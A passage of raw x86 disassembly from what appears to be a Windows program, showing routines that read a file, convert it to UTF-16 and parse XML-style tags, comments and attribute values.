  403ac3:	xor    esi,esi
  403ac5:	test   ecx,ecx
  403ac7:	je     0x403b13
  403ac9:	test   edx,edx
  403acb:	je     0x403b13
  403acd:	cmp    ecx,edx
  403acf:	jae    0x403b13
  403ad1:	jmp    0x403b0a
  403ad3:	cmp    ecx,edx
  403ad5:	jae    0x403b13
  403ad7:	movzx  eax,WORD PTR [ecx]
  403ada:	cmp    eax,0x20
  403add:	je     0x403b11
  403adf:	cmp    eax,0x9
  403ae2:	je     0x403b11
  403ae4:	cmp    eax,0xd
  403ae7:	je     0x403b11
  403ae9:	cmp    eax,0xa
  403aec:	je     0x403b11
  403aee:	cmp    eax,0x2f
  403af1:	je     0x403b11
  403af3:	cmp    eax,0x3c
  403af6:	je     0x403b11
  403af8:	cmp    eax,0x3e
  403afb:	je     0x403b11
  403afd:	cmp    eax,0x3d
  403b00:	je     0x403b11
  403b02:	cmp    eax,0x22
  403b05:	je     0x403b11
  403b07:	add    ecx,0x2
  403b0a:	cmp    WORD PTR [ecx],si
  403b0d:	jne    0x403ad3
  403b0f:	jmp    0x403b13
  403b11:	mov    esi,ecx
  403b13:	mov    eax,esi
  403b15:	pop    esi
  403b16:	ret    
  403b17:	int3   
  403b18:	int3   
  403b19:	int3   
  403b1a:	int3   
  403b1b:	int3   
  403b1c:	mov    edi,edi
  403b1e:	push   ebp
  403b1f:	mov    ebp,esp
  403b21:	push   ecx
  403b22:	push   ecx
  403b23:	push   esi
  403b24:	mov    esi,DWORD PTR [ebp+0x8]
  403b27:	xor    eax,eax
  403b29:	test   esi,esi
  403b2b:	je     0x403cb4
  403b31:	mov    DWORD PTR [esi],eax
  403b33:	test   ecx,ecx
  403b35:	je     0x403cb4
  403b3b:	test   edx,edx
  403b3d:	je     0x403cb4
  403b43:	cmp    ecx,edx
  403b45:	jae    0x403cb4
  403b4b:	cmp    WORD PTR [ecx],ax
  403b4e:	je     0x403cb4
  403b54:	push   ebx
  403b55:	push   0x2
  403b57:	pop    ebx
  403b58:	mov    DWORD PTR [ebp-0x4],0x2f
  403b5f:	mov    DWORD PTR [ebp-0x8],0x3e
  403b66:	push   edi
  403b67:	cmp    ecx,edx
  403b69:	jae    0x403cb2
  403b6f:	movzx  edi,WORD PTR [ecx]
  403b72:	cmp    di,WORD PTR [ebp-0x4]
  403b76:	jne    0x403b99
  403b78:	lea    edi,[ecx+0x2]
  403b7b:	cmp    ecx,edi
  403b7d:	jae    0x403b92
  403b7f:	cmp    edi,edx
  403b81:	jae    0x403b92
  403b83:	push   0x3e
  403b85:	pop    ebx
  403b86:	cmp    WORD PTR [edi],bx
  403b89:	push   0x2
  403b8b:	pop    ebx
  403b8c:	je     0x403c86
  403b92:	mov    ecx,edi
  403b94:	jmp    0x403c7b
  403b99:	cmp    edi,0x3c
  403b9c:	jne    0x403c69
  403ba2:	lea    edi,[ecx+0x2]
  403ba5:	cmp    ecx,edi
  403ba7:	jae    0x403c8e
  403bad:	cmp    edi,edx
  403baf:	jae    0x403c8e
  403bb5:	movzx  edi,WORD PTR [edi]
  403bb8:	cmp    di,WORD PTR [ebp-0x4]
  403bbc:	je     0x403c96
  403bc2:	cmp    edi,0x21
  403bc5:	jne    0x403c34
  403bc7:	lea    edi,[ecx+0x6]
  403bca:	cmp    ecx,edi
  403bcc:	jae    0x403c8e
  403bd2:	cmp    edi,edx
  403bd4:	jae    0x403c8e
  403bda:	push   0x2d
  403bdc:	pop    ebx
  403bdd:	cmp    WORD PTR [ecx+0x4],bx
  403be1:	push   0x2
  403be3:	pop    ebx
  403be4:	jne    0x403c8e
  403bea:	push   0x2d
  403bec:	pop    ebx
  403bed:	cmp    WORD PTR [edi],bx
  403bf0:	push   0x2
  403bf2:	pop    ebx
  403bf3:	jne    0x403c8e
  403bf9:	lea    edi,[ecx+0xc]
  403bfc:	cmp    ecx,edi
  403bfe:	jae    0x403c8e
  403c04:	cmp    edi,edx
  403c06:	jae    0x403c8e
  403c0c:	mov    ecx,edi
  403c0e:	cmp    ecx,edx
  403c10:	jae    0x403c79
  403c12:	push   0x3e
  403c14:	pop    esi
  403c15:	push   0x2d
  403c17:	pop    edi
  403c18:	cmp    WORD PTR [ecx-0x4],di
  403c1c:	jne    0x403c29
  403c1e:	cmp    WORD PTR [ecx-0x2],di
  403c22:	jne    0x403c29
  403c24:	cmp    WORD PTR [ecx],si
  403c27:	je     0x403c2f
  403c29:	add    ecx,ebx
  403c2b:	cmp    ecx,edx
  403c2d:	jb     0x403c18
  403c2f:	mov    esi,DWORD PTR [ebp+0x8]
  403c32:	jmp    0x403c79
  403c34:	push   0x3f
  403c36:	pop    ebx
  403c37:	push   0x2
  403c39:	cmp    di,bx
  403c3c:	pop    ebx
  403c3d:	jne    0x403c8e
  403c3f:	lea    edi,[ecx+0x6]
  403c42:	cmp    ecx,edi
  403c44:	jae    0x403c8e
  403c46:	cmp    edi,edx
  403c48:	jae    0x403c8e
  403c4a:	mov    ecx,edi
  403c4c:	cmp    ecx,edx
  403c4e:	jae    0x403c79
  403c50:	push   0x3e
  403c52:	pop    edi
  403c53:	push   0x3f
  403c55:	pop    esi
  403c56:	cmp    WORD PTR [ecx],di
  403c59:	jne    0x403c61
  403c5b:	cmp    WORD PTR [ecx-0x2],si
  403c5f:	je     0x403c2f
  403c61:	add    ecx,ebx
  403c63:	cmp    ecx,edx
  403c65:	jb     0x403c56
  403c67:	jmp    0x403c2f
  403c69:	cmp    di,WORD PTR [ebp-0x8]
  403c6d:	je     0x403caa
  403c6f:	cmp    edi,0x3d
  403c72:	je     0x403ca2
  403c74:	cmp    edi,0x22
  403c77:	je     0x403c9a
  403c79:	add    ecx,ebx
  403c7b:	cmp    WORD PTR [ecx],ax
  403c7e:	jne    0x403b67
  403c84:	jmp    0x403cb2
  403c86:	mov    DWORD PTR [esi],0x3
  403c8c:	jmp    0x403cb0
  403c8e:	mov    DWORD PTR [esi],0x1
  403c94:	jmp    0x403cb0
  403c96:	mov    DWORD PTR [esi],ebx
  403c98:	jmp    0x403cb0
  403c9a:	mov    DWORD PTR [esi],0x5
  403ca0:	jmp    0x403cb0
  403ca2:	mov    DWORD PTR [esi],0x6
  403ca8:	jmp    0x403cb0
  403caa:	mov    DWORD PTR [esi],0x4
  403cb0:	mov    eax,ecx
  403cb2:	pop    edi
  403cb3:	pop    ebx
  403cb4:	pop    esi
  403cb5:	mov    esp,ebp
  403cb7:	pop    ebp
  403cb8:	ret    0x4
  403cbb:	int3   
  403cbc:	int3   
  403cbd:	int3   
  403cbe:	int3   
  403cbf:	int3   
  403cc0:	mov    edi,edi
  403cc2:	push   ebp
  403cc3:	mov    ebp,esp
  403cc5:	push   ebx
  403cc6:	push   esi
  403cc7:	mov    esi,ecx
  403cc9:	xor    bl,bl
  403ccb:	push   edi
  403ccc:	mov    edi,edx
  403cce:	test   esi,esi
  403cd0:	je     0x403cf8
  403cd2:	test   edi,edi
  403cd4:	je     0x403cf8
  403cd6:	push   esi
  403cd7:	call   DWORD PTR ds:0x4090e4
  403cdd:	cmp    eax,DWORD PTR [ebp+0x8]
  403ce0:	jne    0x403cf8
  403ce2:	push   DWORD PTR [ebp+0x8]
  403ce5:	push   edi
  403ce6:	push   esi
  403ce7:	call   DWORD PTR ds:0x409170
  403ced:	add    esp,0xc
  403cf0:	mov    ebx,eax
  403cf2:	neg    ebx
  403cf4:	sbb    bl,bl
  403cf6:	inc    bl
  403cf8:	pop    edi
  403cf9:	pop    esi
  403cfa:	mov    al,bl
  403cfc:	pop    ebx
  403cfd:	pop    ebp
  403cfe:	ret    0x4
  403d01:	int3   
  403d02:	int3   
  403d03:	int3   
  403d04:	int3   
  403d05:	int3   
  403d06:	mov    edi,edi
  403d08:	push   esi
  403d09:	mov    esi,ecx
  403d0b:	test   esi,esi
  403d0d:	je     0x403d35
  403d0f:	cmp    DWORD PTR [esi],0x0
  403d12:	je     0x403d25
  403d14:	push   DWORD PTR [esi]
  403d16:	push   0x0
  403d18:	call   DWORD PTR ds:0x409050
  403d1e:	push   eax
  403d1f:	call   DWORD PTR ds:0x409054
  403d25:	push   0x60c
  403d2a:	push   0x0
  403d2c:	push   esi
  403d2d:	call   0x407768
  403d32:	add    esp,0xc
  403d35:	pop    esi
  403d36:	ret    
  403d37:	int3   
  403d38:	int3   
  403d39:	int3   
  403d3a:	int3   
  403d3b:	int3   
  403d3c:	mov    edi,edi
  403d3e:	push   ebp
  403d3f:	mov    ebp,esp
  403d41:	sub    esp,0x14
  403d44:	push   ebx
  403d45:	push   esi
  403d46:	xor    esi,esi
  403d48:	mov    ebx,edx
  403d4a:	and    DWORD PTR [ebp-0x4],esi
  403d4d:	or     eax,0xffffffff
  403d50:	push   edi
  403d51:	mov    edi,ecx
  403d53:	mov    DWORD PTR [ebp-0x10],ebx
  403d56:	test   edi,edi
  403d58:	je     0x403f3a
  403d5e:	test   ebx,ebx
  403d60:	je     0x403f3a
  403d66:	push   0x60c
  403d6b:	push   esi
  403d6c:	push   edi
  403d6d:	call   0x407768
  403d72:	add    esp,0xc
  403d75:	push   esi
  403d76:	push   0x80
  403d7b:	push   0x3
  403d7d:	push   esi
  403d7e:	push   0x1
  403d80:	push   0x80000000
  403d85:	push   ebx
  403d86:	call   DWORD PTR ds:0x409034
  403d8c:	mov    DWORD PTR [ebp-0x8],eax
  403d8f:	cmp    eax,0xffffffff
  403d92:	jne    0x403daf
  403d94:	call   DWORD PTR ds:0x409010
  403d9a:	mov    esi,eax
  403d9c:	push   esi
  403d9d:	push   ebx
  403d9e:	push   0x2
  403da0:	push   0x68
  403da2:	call   0x4068f5
  403da7:	add    esp,0x10
  403daa:	jmp    0x403f4d
  403daf:	lea    ecx,[ebp-0x4]
  403db2:	push   ecx
  403db3:	push   eax
  403db4:	call   DWORD PTR ds:0x40902c
  403dba:	mov    ecx,0x4000000
  403dbf:	mov    DWORD PTR [ebp-0xc],eax
  403dc2:	cmp    DWORD PTR [ebp-0x4],esi
  403dc5:	ja     0x403f22
  403dcb:	cmp    eax,ecx
  403dcd:	ja     0x403f22
  403dd3:	lea    ebx,[eax+0x1fff]
  403dd9:	and    ebx,0xffffe000
  403ddf:	cmp    ebx,eax
  403de1:	jae    0x403de5
  403de3:	mov    ebx,eax
  403de5:	push   ebx
  403de6:	push   0x8
  403de8:	call   DWORD PTR ds:0x409050
  403dee:	push   eax
  403def:	call   DWORD PTR ds:0x409048
  403df5:	mov    DWORD PTR [edi],eax
  403df7:	test   eax,eax
  403df9:	jne    0x403e16
  403dfb:	push   0x18a
  403e00:	push   0x2
  403e02:	push   0x66
  403e04:	call   0x4068f5
  403e09:	mov    eax,DWORD PTR [ebp-0x8]
  403e0c:	add    esp,0xc
  403e0f:	push   0xe
  403e11:	jmp    0x403f3c
  403e16:	push   0x0
  403e18:	lea    ecx,[ebp-0x4]
  403e1b:	push   ecx
  403e1c:	push   DWORD PTR [ebp-0xc]
  403e1f:	push   eax
  403e20:	push   DWORD PTR [ebp-0x8]
  403e23:	call   DWORD PTR ds:0x409024
  403e29:	test   eax,eax
  403e2b:	jne    0x403e47
  403e2d:	call   DWORD PTR ds:0x409010
  403e33:	mov    esi,eax
  403e35:	push   esi
  403e36:	push   DWORD PTR [ebp-0x10]
  403e39:	push   0x2
  403e3b:	push   0x6a
  403e3d:	call   0x4068f5
  403e42:	jmp    0x403f32
  403e47:	lea    eax,[ebp-0x14]
  403e4a:	mov    DWORD PTR [ebp-0x14],0x1000
  403e51:	push   eax
  403e52:	push   DWORD PTR [ebp-0x4]
  403e55:	push   DWORD PTR [edi]
  403e57:	call   DWORD PTR ds:0x409000
  403e5d:	test   eax,eax
  403e5f:	jne    0x403f1d
  403e65:	mov    eax,DWORD PTR [edi]
  403e67:	mov    DWORD PTR [ebp-0xc],eax
  403e6a:	mov    eax,ebx
  403e6c:	push   0x2
  403e6e:	pop    ecx
  403e6f:	mul    ecx
  403e71:	mov    ecx,edx
  403e73:	mov    ebx,eax
  403e75:	sar    ecx,0x1f
  403e78:	test   edx,edx
  403e7a:	je     0x403e96
  403e7c:	and    DWORD PTR [edi],esi
  403e7e:	push   0x1a0
  403e83:	push   0x2
  403e85:	push   0x66
  403e87:	call   0x4068f5
  403e8c:	add    esp,0xc
  403e8f:	mov    esi,0x216
  403e94:	jmp    0x403ec0
  403e96:	push   ebx
  403e97:	push   0x8
  403e99:	call   DWORD PTR ds:0x409050
  403e9f:	push   eax
  403ea0:	call   DWORD PTR ds:0x409048
  403ea6:	mov    DWORD PTR [edi],eax
  403ea8:	test   eax,eax
  403eaa:	jne    0x403ec5
  403eac:	push   0x1a6
  403eb1:	push   0x2
  403eb3:	push   0x66
  403eb5:	call   0x4068f5
  403eba:	add    esp,0xc
  403ebd:	push   0xe
  403ebf:	pop    esi
  403ec0:	mov    ebx,DWORD PTR [ebp-0xc]
  403ec3:	jmp    0x403f0b
  403ec5:	shr    ebx,1
  403ec7:	push   ebx
  403ec8:	mov    ebx,DWORD PTR [ebp-0xc]
  403ecb:	push   eax
  403ecc:	push   DWORD PTR [ebp-0x4]
  403ecf:	push   ebx
  403ed0:	push   0x0
  403ed2:	push   0x0
  403ed4:	call   DWORD PTR ds:0x4090d4
  403eda:	mov    DWORD PTR [ebp-0x4],eax
  403edd:	cmp    eax,0x459
  403ee2:	jne    0x403ee9
  403ee4:	push   0xd
  403ee6:	pop    esi
  403ee7:	jmp    0x403ef9
  403ee9:	test   eax,eax
  403eeb:	jne    0x403f0b
  403eed:	call   DWORD PTR ds:0x409010
  403ef3:	mov    esi,eax
  403ef5:	test   esi,esi
  403ef7:	je     0x403f0b
  403ef9:	push   esi
  403efa:	push   0x1b3
  403eff:	push   0x2
  403f01:	push   0x6b
  403f03:	call   0x4068f5
  403f08:	add    esp,0x10
  403f0b:	push   ebx
  403f0c:	push   0x0
  403f0e:	call   DWORD PTR ds:0x409050
  403f14:	push   eax
  403f15:	call   DWORD PTR ds:0x409054
  403f1b:	jmp    0x403f35
  403f1d:	shr    DWORD PTR [ebp-0x4],1
  403f20:	jmp    0x403f35
  403f22:	push   ecx
  403f23:	push   ebx
  403f24:	push   0x1
  403f26:	push   0x69
  403f28:	call   0x4068f5
  403f2d:	mov    esi,0x216
  403f32:	add    esp,0x10
  403f35:	mov    eax,DWORD PTR [ebp-0x8]
  403f38:	jmp    0x403f3d
  403f3a:	push   0x57
  403f3c:	pop    esi
  403f3d:	test   eax,eax
  403f3f:	je     0x403f4d
  403f41:	cmp    eax,0xffffffff
  403f44:	je     0x403f4d
  403f46:	push   eax
  403f47:	call   DWORD PTR ds:0x40903c
  403f4d:	test   esi,esi
  403f4f:	jne    0x403f66
  403f51:	mov    ecx,DWORD PTR [edi]
  403f53:	mov    eax,DWORD PTR [ebp-0x4]
  403f56:	lea    eax,[ecx+eax*2]
  403f59:	mov    DWORD PTR [edi+0x4],eax
  403f5c:	mov    DWORD PTR [edi+0xc],ecx
  403f5f:	mov    eax,DWORD PTR [edi]
  403f61:	mov    DWORD PTR [edi+0x14],eax
  403f64:	jmp    0x403f6d
  403f66:	mov    ecx,edi
  403f68:	call   0x403d06
  403f6d:	pop    edi
  403f6e:	mov    eax,esi
  403f70:	pop    esi
  403f71:	pop    ebx
  403f72:	mov    esp,ebp
  403f74:	pop    ebp
  403f75:	ret    
  403f76:	int3   
  403f77:	int3   
  403f78:	int3   
  403f79:	int3   
  403f7a:	int3   
  403f7b:	mov    edi,edi
  403f7d:	push   ebp
  403f7e:	mov    ebp,esp
  403f80:	push   ecx
  403f81:	push   esi
  403f82:	xor    esi,esi
  403f84:	push   edi
  403f85:	mov    edi,edx
  403f87:	test   ecx,ecx
  403f89:	je     0x403fcf
  403f8b:	test   edi,edi
  403f8d:	je     0x403fcf
  403f8f:	mov    DWORD PTR [edi],esi
  403f91:	cmp    DWORD PTR [ecx],esi
  403f93:	je     0x403fcf
  403f95:	mov    eax,DWORD PTR [ecx+0x8]
  403f98:	test   eax,eax
  403f9a:	je     0x403fcf
  403f9c:	mov    edx,DWORD PTR [ecx+0x4]
  403f9f:	inc    eax
  403fa0:	imul   eax,eax,0xc
  403fa3:	push   ebx
  403fa4:	mov    DWORD PTR [ebp-0x4],edx
  403fa7:	mov    ecx,DWORD PTR [eax+ecx*1]
  403faa:	add    ecx,0x2
  403fad:	call   0x403a7f
  403fb2:	mov    ebx,eax
  403fb4:	test   ebx,ebx
  403fb6:	je     0x403fce
  403fb8:	mov    edx,DWORD PTR [ebp-0x4]
  403fbb:	mov    ecx,ebx
  403fbd:	call   0x403ac0
  403fc2:	test   eax,eax
  403fc4:	je     0x403fce
  403fc6:	sub    eax,ebx
  403fc8:	mov    esi,ebx
  403fca:	sar    eax,1
  403fcc:	mov    DWORD PTR [edi],eax
  403fce:	pop    ebx
  403fcf:	pop    edi
  403fd0:	mov    eax,esi
  403fd2:	pop    esi
  403fd3:	mov    esp,ebp
  403fd5:	pop    ebp
  403fd6:	ret    
  403fd7:	int3   
  403fd8:	int3   
  403fd9:	int3   
  403fda:	int3   
  403fdb:	int3   
  403fdc:	mov    edi,edi
  403fde:	push   ebp
  403fdf:	mov    ebp,esp
  403fe1:	sub    esp,0x10
  403fe4:	push   ebx
  403fe5:	push   esi
  403fe6:	mov    esi,ecx
  403fe8:	mov    DWORD PTR [ebp-0x10],edx
  403feb:	xor    ebx,ebx
  403fed:	test   esi,esi
  403fef:	je     0x404103
  403ff5:	test   edx,edx
  403ff7:	je     0x404103
  403ffd:	mov    eax,DWORD PTR [ebp+0x8]
  404000:	test   eax,eax
  404002:	je     0x404103
  404008:	push   edi
  404009:	push   edx
  40400a:	mov    DWORD PTR [eax],ebx
  40400c:	call   DWORD PTR ds:0x4090e4
  404012:	mov    ecx,eax
  404014:	mov    edi,DWORD PTR [esi+0x4]
  404017:	mov    DWORD PTR [ebp-0x8],ecx
  40401a:	cmp    DWORD PTR [esi],ebx
  40401c:	je     0x404102
  404022:	mov    eax,DWORD PTR [esi+0x8]
  404025:	test   eax,eax
  404027:	je     0x404102
  40402d:	test   ecx,ecx
  40402f:	je     0x404102
  404035:	inc    eax
  404036:	imul   eax,eax,0xc
  404039:	mov    ecx,DWORD PTR [eax+esi*1]
  40403c:	test   ecx,ecx
  40403e:	je     0x404102
  404044:	add    ecx,0x2
  404047:	mov    edx,edi
  404049:	call   0x403a7f
  40404e:	test   eax,eax
  404050:	je     0x404102
  404056:	cmp    eax,edi
  404058:	jae    0x404102
  40405e:	mov    edx,edi
  404060:	mov    ecx,eax
  404062:	call   0x403ac0
  404067:	test   eax,eax
  404069:	je     0x404102
  40406f:	cmp    eax,edi
  404071:	jae    0x404102
  404077:	push   0x22
  404079:	pop    esi
  40407a:	mov    edx,edi
  40407c:	mov    ecx,eax
  40407e:	call   0x403a7f
  404083:	mov    ebx,eax
  404085:	mov    DWORD PTR [ebp-0x4],ebx
  404088:	test   ebx,ebx
  40408a:	je     0x404100
  40408c:	cmp    ebx,edi
  40408e:	jae    0x404100
  404090:	mov    edx,edi
  404092:	mov    ecx,ebx
  404094:	call   0x403ac0
  404099:	mov    DWORD PTR [ebp-0xc],eax
  40409c:	test   eax,eax
  40409e:	je     0x404100
  4040a0:	cmp    eax,edi
  4040a2:	jae    0x404100
  4040a4:	cmp    ebx,eax
  4040a6:	je     0x404100
  4040a8:	mov    ecx,eax
  4040aa:	call   0x403a7f
  4040af:	test   eax,eax
  4040b1:	je     0x404100
  4040b3:	cmp    eax,edi
  4040b5:	jae    0x404100
  4040b7:	cmp    WORD PTR [eax],0x3d
  4040bb:	jne    0x404100
  4040bd:	lea    ecx,[eax+0x2]
  4040c0:	mov    edx,edi
  4040c2:	call   0x403a7f
  4040c7:	mov    ebx,eax
  4040c9:	test   ebx,ebx
  4040cb:	je     0x404100
  4040cd:	cmp    ebx,edi
  4040cf:	jae    0x404100
  4040d1:	cmp    WORD PTR [ebx],si
  4040d4:	jne    0x404100
  4040d6:	lea    esi,[ebx+0x2]
  4040d9:	test   esi,esi
  4040db:	je     0x404100
  4040dd:	test   edi,edi
  4040df:	je     0x404100
  4040e1:	cmp    esi,edi
  4040e3:	jae    0x404100
  4040e5:	xor    eax,eax
  4040e7:	cmp    WORD PTR [esi],ax
  4040ea:	je     0x404100
  4040ec:	push   0x22
  4040ee:	pop    ecx
  4040ef:	cmp    esi,edi
  4040f1:	jae    0x404100
  4040f3:	cmp    WORD PTR [esi],cx
  4040f6:	je     0x40410d
  4040f8:	add    esi,0x2
  4040fb:	cmp    WORD PTR [esi],ax
  4040fe:	jne    0x4040ef
  404100:	xor    ebx,ebx
  404102:	pop    edi
  404103:	pop    esi
  404104:	mov    eax,ebx
  404106:	pop    ebx
  404107:	mov    esp,ebp
  404109:	pop    ebp
  40410a:	ret    0x4
  40410d:	test   esi,esi
  40410f:	je     0x404100
  404111:	cmp    esi,edi
  404113:	jae    0x404100
  404115:	mov    ecx,DWORD PTR [ebp-0x4]
  404118:	mov    edx,DWORD PTR [ebp-0x8]
  40411b:	lea    eax,[ecx+edx*2]
  40411e:	cmp    eax,DWORD PTR [ebp-0xc]
  404121:	jne    0x404135
  404123:	push   edx
  404124:	push   DWORD PTR [ebp-0x10]
  404127:	push   ecx
  404128:	call   DWORD PTR ds:0x409170
  40412e:	add    esp,0xc
  404131:	test   eax,eax
  404133:	je     0x404141
  404135:	lea    eax,[esi+0x2]
  404138:	cmp    eax,edi
  40413a:	jae    0x404100
  40413c:	jmp    0x404077
  404141:	mov    eax,DWORD PTR [ebp+0x8]
  404144:	sub    esi,ebx
  404146:	sar    esi,1
  404148:	dec    esi
  404149:	add    ebx,0x2
  40414c:	mov    DWORD PTR [eax],esi
  40414e:	jmp    0x404102
  404150:	int3   
  404151:	int3   
  404152:	int3   
  404153:	int3   
  404154:	int3   
  404155:	mov    edi,edi
  404157:	push   ebp
  404158:	mov    ebp,esp
  40415a:	push   ecx
  40415b:	mov    edx,ecx
  40415d:	push   ebx
  40415e:	xor    ebx,ebx
  404160:	mov    ecx,ebx
  404162:	test   edx,edx
  404164:	je     0x4041f6
  40416a:	cmp    DWORD PTR [edx],ebx
  40416c:	je     0x4041f6
  404172:	mov    eax,DWORD PTR [edx+0x8]
  404175:	test   eax,eax
  404177:	je     0x4041f6
  404179:	inc    eax
  40417a:	push   esi
  40417b:	imul   esi,eax,0xc
  40417e:	push   edi
  40417f:	add    esi,edx
  404181:	mov    edx,DWORD PTR [edx+0x4]
  404184:	mov    eax,DWORD PTR [esi+0x4]
  404187:	test   eax,eax
  404189:	jne    0x404199
  40418b:	mov    eax,DWORD PTR [esi]
  40418d:	test   eax,eax
  40418f:	je     0x404194
  404191:	lea    ecx,[eax+0x2]
  404194:	xor    edi,edi
  404196:	inc    edi
  404197:	jmp    0x40419e
  404199:	lea    ecx,[eax+0x2]
  40419c:	mov    edi,ebx
  40419e:	test   ecx,ecx
  4041a0:	je     0x4041f4
  4041a2:	cmp    ecx,edx
  4041a4:	jae    0x4041f4
  4041a6:	lea    eax,[ebp-0x4]
  4041a9:	push   eax
  4041aa:	call   0x403b1c
  4041af:	mov    ecx,eax
  4041b1:	test   ecx,ecx
  4041b3:	je     0x4041f4
  4041b5:	mov    eax,DWORD PTR [ebp-0x4]
  4041b8:	cmp    eax,0x1
  4041bb:	jne    0x4041d4
  4041bd:	inc    edi
  4041be:	cmp    edi,eax
  4041c0:	jne    0x4041e9
  4041c2:	mov    DWORD PTR [esi-0x4],ecx
  4041c5:	lea    eax,[ecx+0x2]
  4041c8:	mov    DWORD PTR [esi+0x4],ebx
  4041cb:	mov    bl,0x1
  4041cd:	mov    DWORD PTR [esi],ecx
  4041cf:	mov    DWORD PTR [esi+0x8],eax
  4041d2:	jmp    0x4041f4
  4041d4:	cmp    eax,0x3
  4041d7:	je     0x4041e4
  4041d9:	cmp    eax,0x2
  4041dc:	je     0x4041e4
  4041de:	test   eax,eax
  4041e0:	je     0x4041f4
  4041e2:	jmp    0x4041e9
  4041e4:	sub    edi,0x1
  4041e7:	js     0x4041f1
  4041e9:	inc    ecx
  4041ea:	add    ecx,0x1
  4041ed:	jne    0x4041a2
  4041ef:	jmp    0x4041f4
  4041f1:	mov    DWORD PTR [esi-0x8],ecx
  4041f4:	pop    edi
  4041f5:	pop    esi
  4041f6:	mov    al,bl
  4041f8:	pop    ebx
  4041f9:	mov    esp,ebp
  4041fb:	pop    ebp
  4041fc:	ret    
  4041fd:	int3   
  4041fe:	int3   
  4041ff:	int3   
  404200:	int3   
  404201:	int3   
  404202:	mov    edi,edi
  404204:	push   ebp
  404205:	mov    ebp,esp
  404207:	push   ecx
  404208:	push   ebx
  404209:	push   esi
  40420a:	mov    esi,ecx
  40420c:	xor    ebx,ebx
  40420e:	push   edi
  40420f:	mov    edi,edx
  404211:	test   esi,esi
  404213:	je     0x404251
  404215:	cmp    DWORD PTR [esi],ebx
  404217:	je     0x404251
  404219:	test   edi,edi
  40421b:	je     0x40423c
  40421d:	lea    edx,[ebp-0x4]
  404220:	mov    DWORD PTR [ebp-0x4],ebx
  404223:	mov    ecx,esi
  404225:	call   0x403f7b
  40422a:	test   eax,eax
  40422c:	je     0x404242
  40422e:	push   DWORD PTR [ebp-0x4]
  404231:	mov    edx,eax
  404233:	mov    ecx,edi
  404235:	call   0x403cc0
  40423a:	jmp    0x40423e
  40423c:	mov    al,0x1
  40423e:	test   al,al
  404240:	jne    0x40424f
  404242:	mov    ecx,esi
  404244:	call   0x404155
  404249:	test   al,al
  40424b:	jne    0x404219
  40424d:	jmp    0x404251
  40424f:	mov    bl,0x1
  404251:	pop    edi
  404252:	pop    esi
  404253:	mov    al,bl
  404255:	pop    ebx
  404256:	mov    esp,ebp
  404258:	pop    ebp
  404259:	ret    0x8
  40425c:	int3   
  40425d:	int3   
  40425e:	int3   
  40425f:	int3   
  404260:	int3   
  404261:	mov    edi,edi
  404263:	push   ebp
  404264:	mov    ebp,esp
  404266:	push   ecx
  404267:	push   ecx
  404268:	push   ebx
  404269:	push   edi
  40426a:	mov    edi,ecx
  40426c:	xor    ebx,ebx
  40426e:	test   edi,edi
  404270:	je     0x404305
  404276:	cmp    DWORD PTR [edi],ebx
  404278:	je     0x404305
  40427e:	mov    ecx,DWORD PTR [edi+0x8]
  404281:	cmp    ecx,0x7f
  404284:	jae    0x404305
  404286:	lea    eax,[ecx+0x1]
  404289:	mov    DWORD PTR [ebp-0x4],ebx
  40428c:	push   esi
  40428d:	imul   esi,eax,0xc
  404290:	add    esi,edi
  404292:	mov    eax,DWORD PTR [esi]
  404294:	test   ecx,ecx
  404296:	je     0x40429f
  404298:	test   eax,eax
  40429a:	je     0x404304
  40429c:	add    eax,0x2
  40429f:	test   eax,eax
  4042a1:	je     0x404304
  4042a3:	cmp    eax,DWORD PTR [edi+0x4]
  4042a6:	jae    0x404304
  4042a8:	mov    edx,DWORD PTR [edi+0x4]
  4042ab:	lea    ecx,[ebp-0x8]
  4042ae:	push   ecx
  4042af:	mov    ecx,eax
  4042b1:	call   0x403b1c
  4042b6:	test   eax,eax
  4042b8:	je     0x404304
  4042ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4042bd:	cmp    ecx,0x1
  4042c0:	jne    0x4042e3
  4042c2:	mov    edx,DWORD PTR [ebp-0x4]
  4042c5:	inc    edx
  4042c6:	mov    DWORD PTR [ebp-0x4],edx
  4042c9:	cmp    edx,ecx
  4042cb:	jne    0x4042f9
  4042cd:	mov    DWORD PTR [esi+0x8],eax
  4042d0:	mov    DWORD PTR [esi+0xc],eax
  4042d3:	add    eax,0x2
  4042d6:	mov    DWORD PTR [esi+0x10],ebx
  4042d9:	mov    bl,cl
  4042db:	mov    DWORD PTR [esi+0x14],eax
  4042de:	inc    DWORD PTR [edi+0x8]
  4042e1:	jmp    0x404304
  4042e3:	cmp    ecx,0x3
  4042e6:	je     0x4042f3
  4042e8:	cmp    ecx,0x2
  4042eb:	je     0x4042f3
  4042ed:	test   ecx,ecx
  4042ef:	je     0x404304
  4042f1:	jmp    0x4042f9
  4042f3:	sub    DWORD PTR [ebp-0x4],0x1
  4042f7:	js     0x404301
  4042f9:	inc    eax
  4042fa:	add    eax,0x1
  4042fd:	jne    0x4042a3
  4042ff:	jmp    0x404304
  404301:	mov    DWORD PTR [esi+0x4],eax
  404304:	pop    esi
  404305:	pop    edi
  404306:	mov    al,bl
  404308:	pop    ebx
  404309:	mov    esp,ebp
  40430b:	pop    ebp
  40430c:	ret    
  40430d:	int3   
  40430e:	int3   
  40430f:	int3   
  404310:	int3   
  404311:	int3   
  404312:	mov    edx,DWORD PTR [ecx+0x8]
  404315:	xor    al,al
  404317:	test   edx,edx
  404319:	je     0x404323
  40431b:	lea    eax,[edx-0x1]
  40431e:	mov    DWORD PTR [ecx+0x8],eax
  404321:	mov    al,0x1
  404323:	ret    
  404324:	int3   
  404325:	int3   
  404326:	int3   
  404327:	int3   
  404328:	int3   
  404329:	mov    edi,edi
  40432b:	push   ebp
  40432c:	mov    ebp,esp
  40432e:	push   ecx
  40432f:	push   ecx
  404330:	mov    eax,ecx
  404332:	mov    DWORD PTR [ebp-0x8],edx
  404335:	push   esi
  404336:	xor    esi,esi
  404338:	mov    DWORD PTR [ebp-0x4],eax
  40433b:	test   eax,eax
  40433d:	je     0x404377
  40433f:	push   edi
  404340:	mov    edi,esi
  404342:	cmp    DWORD PTR [ebp+0xc],esi
  404345:	jbe    0x404376
  404347:	push   ebx
  404348:	mov    ebx,DWORD PTR [ebp+0x8]
  40434b:	push   edx
  40434c:	push   DWORD PTR [ebx]
  40434e:	push   eax
  40434f:	call   DWORD PTR ds:0x409170
  404355:	add    esp,0xc
  404358:	test   eax,eax
  40435a:	je     0x40436d
  40435c:	mov    eax,DWORD PTR [ebp-0x4]
  40435f:	inc    edi
